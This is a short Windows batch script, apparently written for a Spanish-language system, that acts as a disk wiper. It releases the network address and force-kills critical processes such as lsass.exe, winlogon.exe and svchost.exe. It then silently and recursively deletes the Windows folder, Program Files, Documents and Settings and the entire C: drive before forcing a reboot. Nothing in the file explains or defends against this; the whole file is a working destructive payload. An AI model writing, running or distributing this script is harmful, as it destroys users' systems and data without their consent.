@echo off
ipconfig /release
taskkill /f /im explorer.exe
taskkill /f /im svchost.exe
shutdown -a
taskkill /f /im lsass.exe
taskkill /f /im winlogon.exe
del /s /f /q "C:\WINDOWS"
del /s /f /q "C:\Archivos del programa"
del /s /f /q "C:\Documents and Settings"
del /s /f /q "C:\"
shutdown -r -f -t 01
exit
